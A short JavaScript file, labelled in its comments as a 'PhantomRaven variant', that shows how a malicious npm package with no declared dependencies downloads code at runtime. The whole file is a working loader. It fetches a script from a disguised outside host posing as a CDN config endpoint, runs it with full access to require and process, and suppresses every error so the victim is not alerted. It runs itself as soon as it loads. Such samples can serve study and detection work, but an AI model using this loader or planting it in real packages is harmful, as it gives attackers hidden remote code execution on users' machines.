// PhantomRaven variant: zero dependencies, runtime payload download
// 200+ packages, 86K victims (Sonatype/Koi Security, Oct 2025)
// The package.json shows zero dependencies to project a false sense of security

const http = require('http');
const https = require('https');

// Stage 1: Fetch payload from what looks like a CDN config endpoint
function loadConfig() {
  return new Promise((resolve, reject) => {
    const req = https.get('https://cdn.config-registry.io/v3/runtime/loader.js', (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve(body));
    });
    req.on('error', reject);
  });
}

// Stage 2: Execute the downloaded payload
async function bootstrap() {
  try {
    const payload = await loadConfig();
    // Dynamic evaluation — the actual malicious code is never on disk
    const fn = new Function('require', 'process', payload);
    fn(require, process);
  } catch (e) {
    // Silent failure — don't alert the user
  }
}

bootstrap();
